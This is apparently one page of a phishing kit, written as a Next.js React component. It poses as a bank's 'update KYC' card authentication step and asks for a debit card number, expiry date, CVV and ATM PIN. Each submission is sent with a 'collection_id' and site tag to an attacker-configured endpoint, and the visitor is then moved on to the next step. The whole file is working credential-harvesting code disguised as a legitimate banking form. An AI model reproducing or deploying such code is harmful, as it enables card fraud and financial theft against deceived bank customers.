'use client';
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";  
import styles from '../MyStyleForm.module.css';


export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;

    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            router.push('/3');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    <h5 className={`${styles.Centering} mb-0 mt-4`}>Authenticate your card for update KYC</h5>
    <a className="link-primary text-center d-flex justify-content-center w-100 mt-4">
      You Sucessfully Entered <br />
      Mobile Number xxxxxxxxxx
    </a>
    <div className={styles.formContainer}>
      <form onSubmit={handleSubmit} >
        <DebitCardInputComponent />

        <div className="d-flex gap-4">
            <ExpiryDateInputComponent />
          <div className={styles.inputGroup}>
            <input type="password" minLength={3} maxLength={3} inputMode="numeric"  name="cvv" required placeholder=" " />
            <label>CVV</label>
          </div>
        </div>
        <div className={styles.inputGroup}>
            <input type="password" maxLength={4} inputMode="numeric" minLength={4} name="pin" required placeholder=" " />
            <label>PIN Number</label>
          </div>
        <button type="submit"  className={styles.button}>
          Submit
        </button>
        
        <a href="#" className={styles.assistanceLink}>
          Need assistance activating mobile banking
        </a>
      </form>
    </div>
    <Footer />
</>
  );
}
